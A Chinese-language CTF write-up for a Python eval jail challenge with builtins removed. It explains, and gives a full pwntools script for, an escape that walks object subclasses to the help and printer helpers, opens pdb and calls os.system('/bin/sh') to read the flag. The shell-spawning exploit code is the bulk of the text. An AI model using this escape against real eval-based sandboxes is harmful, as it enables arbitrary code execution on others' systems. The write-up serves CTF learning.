# Easy Pyjail 1 WP

附件：

```python
# flag is located somewhere in the file system

while True:
    code = input("jail>")
    print(eval(code, {'__builtins__': {}}))
```

本题是 SECCON 2024 Quals 1linepyjail 去掉约束的简单版，经典的禁掉 `__builtins__` 的 pyjail 题，有很多种解法，详情可以参考我的 [Pyjail 总结](../../misc/pyjail.md)。这里给出一个参考的解法：

1. 通过 `().__class__.__base__.__subclasses__()` 来找到一系列内置的类
2. 例化其中的 Helper 类，从而实现 `help()` 的效果，然后加载 pdb 模块
3. 通过 Printer 类，找到 sys 模块，进而访问 pdb 模块，调用 `pdb.set_trace()`
4. 此时就可以任意调用 Python 代码，例如 get shell

攻击代码如下：

```python
from pwn import *

context(log_level="debug")

# step 1. locate Helper and Printer
p = process(["python3", "main.py"])
p.recvuntil(b"jail>")
p.sendline("().__class__.__base__.__subclasses__()".encode())
res = p.recvline().decode().removesuffix("]\n")

helper_index = res.split(", ").index("<class '_sitebuiltins._Helper'>")
printer_index = res.split(", ").index("<class '_sitebuiltins._Printer'>")
print("Helper", helper_index)
print("Printer", printer_index)

# step 2. call help() to load pdb module
p = process(["python3", "main.py"])
p.recvuntil(b"jail>")
p.sendline((f"().__class__.__base__.__subclasses__()[{helper_index}]()()").encode())
# load pdb and return to jail
p.sendline(b"pdb")
p.sendline(b"main")
p.recvuntil(b"jail>")
# step 3. locate sys module and call `sys.modules['pdb'].set_trace()`
p.sendline(
    (
        f"().__class__.__base__.__subclasses__()[{printer_index}]"
        + ".__init__.__globals__['sys'].modules['pdb'].set_trace()"
    ).encode()
)
# in pdb
p.recvuntil(b"(Pdb) ")
p.sendline(
    (
        f"().__class__.__base__.__subclasses__()[{printer_index}]"
        + ".__init__.__globals__['sys'].modules['os'].system('/bin/sh')"
    ).encode()
)
p.sendline(b"cat flag")
p.interactive()
```

除了 Python jail 以外，还有很多类似的题目，感兴趣的同学可以关注每年的 jailCTF。
